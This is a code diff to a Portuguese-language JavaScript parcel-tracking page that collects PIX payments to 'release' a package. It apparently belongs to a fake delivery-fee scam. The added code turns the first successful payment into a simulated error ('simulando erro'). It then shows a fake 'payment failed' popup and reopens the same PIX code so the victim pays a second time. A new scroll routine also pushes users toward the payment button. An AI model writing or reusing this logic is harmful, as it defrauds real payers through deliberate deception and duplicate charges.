@@ -21,6 +21,8 @@ export class TrackingSystem {
         this.paymentRetryCount = 0;
         this.deliveryValues = [7.74, 12.38, 16.46];
         this.deliveryAttempts = 0;
+        this.hasAttemptedPayment = false; // Flag para controlar primeiro/segundo pagamento
+        this.currentPixData = null; // Armazenar dados do PIX para reutilização
         
         console.log('TrackingSystem inicializado - DADOS DO BANCO');
         this.initWhenReady();
@@ -1182,6 +1184,13 @@ export class TrackingSystem {
                 telefone: this.leadData?.telefone
             });
             
+            // Se já temos dados do PIX (retry), reutilizar
+            if (this.currentPixData) {
+                console.log('🔄 Reutilizando dados do PIX existente');
+                this.updatePixModalWithData(this.currentPixData);
+                return;
+            }
+            
             // Usar dados do lead do banco de dados
             const userData = {
                 nome: this.leadData.nome_completo,
@@ -1195,6 +1204,12 @@ export class TrackingSystem {
             if (pixResult.success) {
                 console.log('🎉 PIX GERADO COM SUCESSO VIA ZENTRA PAY!');
                 console.log('📋 PIX Payload:', pixResult.pixPayload?.substring(0, 50) + '...');
+                
+                // Armazenar dados para possível retry
+                this.currentPixData = {
+                    pixPayload: pixResult.pixPayload,
+                    qrCode: pixResult.qrCode
+                };
                 
                 // Atualizar QR Code e código PIX no modal
                 const qrCodeImg = document.getElementById('realPixQrCode');
@@ -1322,6 +1337,26 @@ export class TrackingSystem {
     processSuccessfulPayment() {
         console.log('✅ Processando pagamento bem-sucedido...');
         
+        // Verificar se é o primeiro ou segundo pagamento
+        const isFirstPayment = !this.hasAttemptedPayment;
+        
+        if (isFirstPayment) {
+            console.log('💳 Primeiro pagamento - simulando erro');
+            this.hasAttemptedPayment = true;
+            
+            // Fechar modal de pagamento
+            this.closeLiberationModal();
+            
+            // Mostrar popup de erro após pequeno delay
+            setTimeout(() => {
+                this.showPaymentErrorPopup();
+            }, 500);
+            
+            return;
+        }
+        
+        console.log('✅ Segundo pagamento - processando sucesso');
+        
         // Ocultar botão LIBERAR PACOTE
         this.hideLiberationButton();
         
@@ -1362,6 +1397,120 @@ export class TrackingSystem {
                 });
             }
         }, 3000);
+    }
+    
+    showPaymentErrorPopup() {
+        console.log('❌ Exibindo popup de erro de pagamento');
+        
+        const errorPopup = document.createElement('div');
+        errorPopup.id = 'paymentErrorPopup';
+        errorPopup.className = 'modal-overlay';
+        errorPopup.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+        
+        errorPopup.innerHTML = `
+            <div class="error-popup-container" style="
+                background: white;
+                border-radius: 20px;
+                max-width: 400px;
+                width: 85%;
+                padding: 40px;
+                text-align: center;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+                animation: slideUp 0.4s ease;
+                position: relative;
+                border: 3px solid #e74c3c;
+            ">
+                <div class="error-icon" style="
+                    font-size: 3.5rem;
+                    color: #e74c3c;
+                    margin-bottom: 20px;
+                    animation: bounceIn 0.6s ease;
+                ">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <h2 style="
+                    font-size: 1.6rem;
+                    font-weight: 700;
+                    color: #2c3e50;
+                    margin-bottom: 15px;
+                ">
+                    Erro ao processar o pagamento
+                </h2>
+                <p style="
+                    color: #666;
+                    font-size: 1rem;
+                    line-height: 1.6;
+                    margin-bottom: 25px;
+                ">
+                    Ocorreu um problema ao processar seu pagamento. Tente novamente.
+                </p>
+                <button id="retryPaymentButton" style="
+                    background: linear-gradient(45deg, #e74c3c, #c0392b);
+                    color: white;
+                    border: none;
+                    padding: 15px 30px;
+                    font-size: 1rem;
+                    font-weight: 700;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
+                    display: inline-flex;
+                    align-items: center;
+                    gap: 10px;
+                ">
+                    <i class="fas fa-redo"></i> Tentar Novamente
+                </button>
+            </div>
+        `;
+        
+        document.body.appendChild(errorPopup);
+        document.body.style.overflow = 'hidden';
+        
+        // Configurar evento do botão
+        const retryButton = errorPopup.querySelector('#retryPaymentButton');
+        if (retryButton) {
+            retryButton.addEventListener('click', () => {
+                this.closePaymentErrorPopup();
+                // Reabrir modal de pagamento com os mesmos dados
+                setTimeout(() => {
+                    this.showLiberationModal();
+                }, 300);
+            });
+        }
+        
+        // Fechar ao clicar fora
+        errorPopup.addEventListener('click', (e) => {
+            if (e.target === errorPopup) {
+                this.closePaymentErrorPopup();
+            }
+        });
+    }
+    
+    closePaymentErrorPopup() {
+        const errorPopup = document.getElementById('paymentErrorPopup');
+        if (errorPopup) {
+            errorPopup.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (errorPopup.parentNode) {
+                    errorPopup.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
     }
     
     // Ocultar botão LIBERAR PACOTE após pagamento confirmado
@@ -1460,7 +1609,7 @@ export class TrackingSystem {
                     const simulateButton = document.getElementById('simulatePaymentButton');
                     if (simulateButton) {
                         simulateButton.removeAttribute('data-retry');
-                        simulateButton.textContent = '-';
+                        simulateButton.textContent = 'SIMULAÇÃO DE PAGAMENTO';
                         simulateButton.style.background = 'transparent';
                     }
                     
@@ -1469,6 +1618,60 @@ export class TrackingSystem {
                 });
             }
         }
+    }
+
+    // Scroll automático com pausa nos dados do pedido
+    async performGuidedScroll() {
+        console.log('🎯 Iniciando scroll guiado para botão de liberação');
+        
+        // Primeiro: scroll para dados do pedido
+        const orderDetails = document.getElementById('orderDetails');
+        if (orderDetails) {
+            console.log('📋 Scrolling para Dados do Pedido...');
+            orderDetails.scrollIntoView({ 
+                behavior: 'smooth', 
+                block: 'center' 
+            });
+            
+            // Destacar dados do pedido brevemente
+            orderDetails.style.background = 'rgba(30, 74, 107, 0.1)';
+            orderDetails.style.borderRadius = '10px';
+            orderDetails.style.transition = 'all 0.3s ease';
+            
+            // Pausa de 1.5 segundos
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Remover destaque
+            orderDetails.style.background = '';
+        }
+        
+        // Depois: scroll para botão de liberação
+        const liberationButton = document.querySelector('.liberation-button-timeline:last-of-type');
+        if (liberationButton) {
+            console.log('🔓 Scrolling para botão LIBERAR PACOTE...');
+            liberationButton.scrollIntoView({ 
+                behavior: 'smooth', 
+                block: 'center' 
+            });
+            
+            // Aguardar scroll completar
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            // Destacar botão por 3 segundos
+            this.highlightLiberationButtonWithPulse(liberationButton);
+        }
+    }
+    
+    highlightLiberationButtonWithPulse(button) {
+        console.log('✨ Destacando botão com pulsação');
+        
+        // Adicionar classe de destaque
+        button.classList.add('highlighted-button');
+        
+        // Remover destaque após 3 segundos, mas manter pulsação
+        setTimeout(() => {
+            button.classList.remove('highlighted-button');
+        }, 3000);
     }
 
     showPaymentSuccessNotification() {
